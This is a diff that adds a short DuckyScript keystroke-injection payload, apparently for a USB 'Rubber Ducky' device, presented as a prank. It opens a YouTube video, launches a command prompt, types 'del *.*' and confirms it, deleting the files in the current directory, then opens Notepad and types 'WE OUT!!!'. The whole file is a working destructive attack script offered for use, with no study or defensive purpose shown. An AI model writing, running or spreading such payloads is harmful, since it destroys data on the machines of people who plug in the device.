@@ -1,0 +1,27 @@
+# We out script
+# Author: KeyboardKomando
+# Designed to show the Minon mic drop and delete files
+DELAY 3000
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=zIdUlp3QAsk
+DELAY 800
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING del *.*
+DELAY 300
+ENTER
+STRING y
+DELAY 300
+ENTER
+DELAY 500
+STRING notepad
+ENTER
+DELAY 200
+STRING WE OUT!!!
